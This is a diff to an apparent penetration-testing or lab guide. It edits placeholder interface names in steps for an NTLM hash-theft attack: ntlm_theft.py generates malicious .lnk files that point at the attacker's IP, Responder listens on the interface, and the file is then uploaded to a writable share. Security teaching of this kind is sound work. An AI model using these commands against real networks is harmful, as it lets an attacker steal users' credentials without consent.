@@ -232,14 +232,14 @@ With write access to a share, we plant a malicious `.lnk` file. When any user br
 ### Step 1 — Generate malicious files
 
 ```bash
-# Find your <INTERFACE> IP first: ip addr show <INTERFACE>
-ntlm_theft.py --verbose --generate modern --server <YOUR_TUN0_IP> --filename "meetingXYZ"
+# Find your <tun0> IP first: ip addr show <tun0>
+ntlm_theft.py --verbose --generate modern --server <YOUR_tun0_IP> --filename "meetingXYZ"
 ```
 
 ### Step 2 — Start Responder
 
 ```bash
-sudo responder -I <INTERFACE> -wv
+sudo responder -I <tun0> -wv
 ```
 
 ### Step 3 — Upload the `.lnk` to the share
